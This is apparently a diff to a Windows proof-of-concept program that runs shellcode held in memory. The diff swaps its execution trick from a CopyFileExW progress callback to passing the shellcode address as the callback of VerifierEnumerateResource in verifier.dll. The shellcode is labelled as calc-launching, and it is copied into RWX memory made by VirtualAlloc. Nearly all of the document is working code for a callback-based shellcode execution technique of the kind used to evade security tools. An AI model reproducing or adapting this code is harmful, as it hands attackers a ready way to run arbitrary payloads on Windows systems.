@@ -1,5 +1,14 @@
 #include <windows.h>
+#include<avrfsdk.h>
 #include <stdio.h>
+
+typedef ULONG(WINAPI* VerifierEnumResourceFn)(
+    HANDLE Process,
+    ULONG  Flags,
+    ULONG  ResourceType,
+    AVRF_RESOURCE_ENUMERATE_CALLBACK ResourceCallback,
+    PVOID  EnumerationContext
+    );
 
 // alfarom256 calc shellcode
 unsigned char op[] =
@@ -31,7 +40,19 @@ int main() {
     LPVOID addr = ::VirtualAlloc(NULL, sizeof(op), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     ::RtlMoveMemory(addr, op, sizeof(op));
 
-    ::DeleteFileW(L"C:\\Windows\\Temp\\backup.log");
-    ::CopyFileExW(L"C:\\Windows\\DirectX.log", L"C:\\Windows\\Temp\\backup.log", (LPPROGRESS_ROUTINE)addr, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS);
+    HMODULE lib = LoadLibraryW(L"verifier.dll");
+
+    VerifierEnumResourceFn VerifierEnumResource;
+    
+    *(FARPROC*)&VerifierEnumResource = GetProcAddress(lib,"VerifierEnumerateResource");
+    
+    if (NULL == VerifierEnumResource)
+    {
+        printf("could not find entry point %s in verifier.dll\n",
+            "VerifierEnumerateResource");
+        return GetLastError();
+    }
+
+    VerifierEnumResource(::GetCurrentProcess(), NULL, AvrfResourceHeapAllocation, (AVRF_RESOURCE_ENUMERATE_CALLBACK)addr, NULL);
 
 }
